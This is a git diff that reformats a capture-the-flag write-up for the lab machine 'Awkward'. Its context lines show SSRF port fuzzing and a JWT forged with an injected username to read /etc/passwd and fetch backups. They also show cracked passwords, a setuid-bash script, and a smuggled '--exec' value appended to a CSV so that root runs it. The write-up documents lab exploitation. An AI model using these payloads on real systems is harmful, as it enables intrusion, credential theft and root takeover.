@@ -15,7 +15,6 @@ Please also note that the target IP changes a couple times, as I had to revert t
 
 ## Recon and Initial Access 
 &nbsp;
-&nbsp;
 
 First, I performed some basic `nmap` scans. Using `sudo nmap -sC -sV -Pn 10.129.228.81`, I found SSH and a web server:
 
@@ -27,7 +26,7 @@ Running an initial `curl`, I found a domain `hat-valley.htb`:
 
 Having added this to our hosts, I proceeded to examine the website:
 
-![image](/assets/images/awkward/awkward3.png){:height="90" width="90%"}
+![image](/assets/images/awkward/awkward3.png)
 
 I also decided to fuzz for content, and subdomains and vhosts, finding `store.hat-valley.htb` as well. Browsing to this, I was presented with an HTTP authentication prompt, and put it aside for the time being.
 
@@ -35,14 +34,13 @@ I also decided to fuzz for content, and subdomains and vhosts, finding `store.ha
 
 Browsing through the homepage source, I found a reference to a JavaScript file `app.js`. Both the name and the fact this was a nonstandard name caught my eye. Indeed, I found application source code:
 
-![image](/assets/images/awkward/awkward5.png){:height="90%" width="90%"}
+![image](/assets/images/awkward/awkward5.png)
 
 Manually skimming through this gave me a sense of the format, and I able to find some routes, made easier by the following admittedly ugly command:
 
 ```
 curl -s http://hat-valley.htb/js.app.js | grep routes | sed 's/path:/\n/g' | grep '\ \\*\/' | awk '{print $2}' FS='"' | tr -d \\
 ```
-&nbsp;
 &nbsp;
 
 ![image](/assets/images/awkward/awkward6.png)
@@ -61,7 +59,7 @@ First, I examined `/hr` and found a login page, but was unable to do anything wi
 curl -s http://hat-valley.htb/js/app.js | sed 's/baseURL + /\n/g' | grep "return response" | awk '{print $2}' FS="'"
 ```
 &nbsp;
-&nbsp;
+
 
 ![image](/assets/images/awkward/awkward7.png)
 
@@ -80,7 +78,7 @@ It appeared that one could:
 3. Examine staff and 
 4. Interact with the store 
 &nbsp;
-&nbsp;
+
 
 via the API. I immediately tested `staff-details` as it might have contained credentials. Lo and behold, I was able to get a variety of user details, including usernames, SHA256-hashed passwords, real names, company roles, and phone numbers.
 
@@ -95,15 +93,15 @@ Username: christopher.jones
 Password: chris123
 ```
 &nbsp;
-&nbsp;
+
 
 This did not allow me to simply SSH in, but I was able to log in to the HR portal I found earlier:
 
-![image](/assets/images/awkward/awkward10.png){:height="90%" width="90%"}
+![image](/assets/images/awkward/awkward10.png)
 
 Playing around with the functionality while capturing requests with Burp, I found a JWT when using the status refresh functionality.
 
-![image](/assets/images/awkward/awkward11.png){:height="90%" width="90%"}
+![image](/assets/images/awkward/awkward11.png)
 
 I was able to successfully crack this (and this time, hashcat was cooperating - I suspect I had just been fatigued when formatting the sha256 hash earlier):
 
@@ -113,18 +111,17 @@ I was able to successfully crack this (and this time, hashcat was cooperating - 
 123beany123
 ```
 &nbsp;
-&nbsp;
+
 
 This was likely a password, given both the format and the purpose of the JWT in the request. Having unsuccessfully attempted small manual password sprays for both the HR portal and SSH (i.e., all known usernames with this password), I then decided to see if this token could be used to interact with the API. First, I tested `store-status` and noticed that I could make localhost port 80 the value of the `url` parameter and successfully request the homepage, indicating a Server-Side Request Forgery (SSRF) vulnerability:
 
-![image](/assets/images/awkward/awkward13.png){:height="90%" width="90%"}
+![image](/assets/images/awkward/awkward13.png)
 
 Given the SSRF, I decided to see if there were any resources I could only access "internally" by abusing it. Beginning by fuzzing port numbers (initially, 0-9999) I found two previously-unknown ports.
 
 ```
 ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http//127.0.0.1:FUZZ"' -fs 0
 ```
-&nbsp;
 &nbsp;
 
 
@@ -135,7 +132,7 @@ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley
 8080
 ```
 &nbsp;
-&nbsp;
+
 
 First, I examined 3002, rendering in Burp, and discovered the internal API documentation.
 
@@ -147,15 +144,14 @@ The `login` endpoint requires a username and password. Given that I had a token,
 
 At this time, I hadn't set all my Burp plugins back up, so decided to create the payload using the `jwt.io` web service, successfully reading `/etc/passwd`
 
-![image](/assets/images/awkward/awkward17.png){:height="90%" width="90%"}
-
+![image](/assets/images/awkward/awkward17.png)
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE1MTYyMzkwMjJ9.P8Xa-exYSL2gWWnTE2I2pZsesofPuzQaPrvjvj3uzpU
 ```
 &nbsp;
-&nbsp;
 
-![image](/assets/images/awkward/awkward18.png){:height="90%" width="90%"}
+
+![image](/assets/images/awkward/awkward18.png)
 
 Going through the list, I found more regular users other than root:
 
@@ -166,7 +162,7 @@ bean
 christine
 ```
 &nbsp;
-&nbsp;
+
 
 At this point, although I was skeptical I decided to see if I could simply read the `user.txt`, taking the educated guess that it was either in `bean` or `christine`'s home directory. Unsurprisingly, this didn't work. I therefore decided to use the `123beany123` password to SSH into these two users, but was unsuccessful. Given the password, it was therefore safe to assume for the time being that this was only `bean`'s API/HR password. However, in the process of using the file read to enumerate the users' home directories, I discovered a gzip backup of some sort in `bean`'s homedir, and successfully attempted to download it with `curl` using the JWT I crafted:
 
@@ -174,13 +170,13 @@ At this point, although I was skeptical I decided to see if I could simply read 
 curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTUxNjIzOTAyMn0.y7_OwRtuzV8lCTwYe1Ac1t2nG50wjK38MeajRYAKAuM" --output bean_backup_final.tar.gz
 ```
 &nbsp;
-&nbsp;
 
-![image](/assets/images/awkward/awkward20.png){:height="90%" width="90%"}
+
+![image](/assets/images/awkward/awkward20.png)
 
 ## bean's backup and the user flag
 &nbsp;
-&nbsp;
+
 
 The backup I downloaded earlier appears to be a full backup of `bean`'s home directory from an earlier time:
 
@@ -194,7 +190,7 @@ I decided to hunt for credentials. While `bean` had the good sense to not leave 
 014mrbeanrules!#P
 ```
 &nbsp;
-&nbsp;
+
 
 Finally, I was able to successfully SSH into the server as `bean` and obtain the `user.txt`
 
@@ -204,7 +200,7 @@ Finally, I was able to successfully SSH into the server as `bean` and obtain the
 
 ## Privilege escalation
 &nbsp;
-&nbsp;
+
 
 Some of the most basic privilege escalation vectors, such as sudo misconfigurations or dangerous suid binaries, didn't work. Using pspy64 to examine processes, however, I found some interesting commands running as root:
 
@@ -226,10 +222,8 @@ Username: admin
 Password: 014mrbeanrules!#P
 ```
 &nbsp;
-&nbsp;
 
-![image](/assets/images/awkward/awkward28.png){:height="90%" width="90%"}
-
+![image](/assets/images/awkward/awkward28.png)
 Since I had a shell on the webserver, I decided to see if I could read the server-side files for the store on top of the client-side source, and I could. 
 
 ![image](/assets/images/awkward/awkward29.png)
@@ -257,7 +251,6 @@ The attack would work as follows:
 2. Use the filename of the item server-side as my `user_id`
 3. Using the valid `item_id` from above, modify it to use my script
 4. `system()` will then execute `sed -e`, in turn executing my script
-&nbsp;
 &nbsp;
 
 First, I obtained the format of a valid item by adding one to the cart.
@@ -291,7 +284,6 @@ As discussed earlier, I now had a very simple method to privesc to root via `mai
 chmod +s /bin/bash
 ```
 &nbsp;
-&nbsp;
 
 which as before I put in `/tmp`. Note that I had come back after a break at this point and needed to start the machine again, hence the changed IP addresses in what follows. 
 
@@ -302,11 +294,10 @@ I then added the malicious leave request as the webserver:
 echo '" --exec="\!/tmp/uwu.sh"' >> leave_requests.csv
 ```
 &nbsp;
-&nbsp;
 
 Back in the shell as `bean`, I successfully obtained root.
 
-![image](/assets/images/awkward/awkward37.png){:height="90%" width="90%"}
+![image](/assets/images/awkward/awkward37.png)
 
 
 
